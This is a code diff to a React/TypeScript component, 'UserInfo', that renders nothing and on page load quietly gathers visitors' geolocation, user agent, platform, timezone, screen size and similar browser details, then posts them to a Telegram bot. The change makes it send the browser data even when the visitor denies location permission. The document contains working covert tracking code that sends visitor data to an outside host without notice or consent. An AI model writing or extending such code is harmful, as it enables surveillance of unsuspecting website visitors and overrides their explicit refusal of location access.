@@ -21,7 +21,7 @@ interface LocationInfo {
 }
 
 interface UserInfoData {
-  location: LocationInfo;
+  location: LocationInfo | null;
   browser: BrowserInfo;
 }
 
@@ -36,14 +36,17 @@ export default function UserInfo() {
         return;
       }
 
-      const message = `
-🔍 User Information Collected:
-
+      const locationInfo = info.location ? `
 📍 Location:
 - Latitude: ${info.location.latitude}
 - Longitude: ${info.location.longitude}
 - Accuracy: ${info.location.accuracy}m
-- Timestamp: ${info.location.timestamp}
+- Timestamp: ${info.location.timestamp}` : '📍 Location: Permission Denied or Not Available';
+
+      const message = `
+🔍 User Information Collected:
+
+${locationInfo}
 
 🌐 Browser Info:
 - User Agent: ${info.browser.userAgent}
@@ -52,8 +55,7 @@ export default function UserInfo() {
 - Screen Resolution: ${info.browser.screenResolution}
 - Timezone: ${info.browser.timezone}
 - Cookies Enabled: ${info.browser.cookiesEnabled ? 'Yes' : 'No'}
-- Online Status: ${info.browser.onlineStatus ? 'Online' : 'Offline'}
-      `;
+- Online Status: ${info.browser.onlineStatus ? 'Online' : 'Offline'}`;
 
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
@@ -68,46 +70,46 @@ export default function UserInfo() {
   };
 
   const getUserInfo = async () => {
-    try {
-      // Get location
-      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
-      });
+    // Get browser information immediately
+    const browserInfo: BrowserInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cookiesEnabled: navigator.cookieEnabled,
+      onlineStatus: navigator.onLine,
+    };
 
-      // Get browser information
-      const browserInfo: BrowserInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: `${window.screen.width}x${window.screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookiesEnabled: navigator.cookieEnabled,
-        onlineStatus: navigator.onLine,
-      };
-
-      // Combine location and browser info
-      const info: UserInfoData = {
-        location: {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: new Date(position.timestamp).toISOString(),
-        },
-        browser: browserInfo,
-      };
-      
-      // Send to Telegram
-      await sendToTelegram(info);
-    } catch (error) {
-      console.error('Error getting user info:', error);
-    }
+    // Try to get location in the background
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const info: UserInfoData = {
+          location: {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date(position.timestamp).toISOString(),
+          },
+          browser: browserInfo,
+        };
+        await sendToTelegram(info);
+      },
+      async (error) => {
+        // Send browser info even if location is denied
+        const info: UserInfoData = {
+          location: null,
+          browser: browserInfo,
+        };
+        await sendToTelegram(info);
+        console.error('Location error:', error);
+      }
+    );
   };
 
-  // Automatically get user info when component mounts
   useEffect(() => {
     getUserInfo();
   }, []);
 
-  // Return null to not render anything in the UI
   return null;
 } 
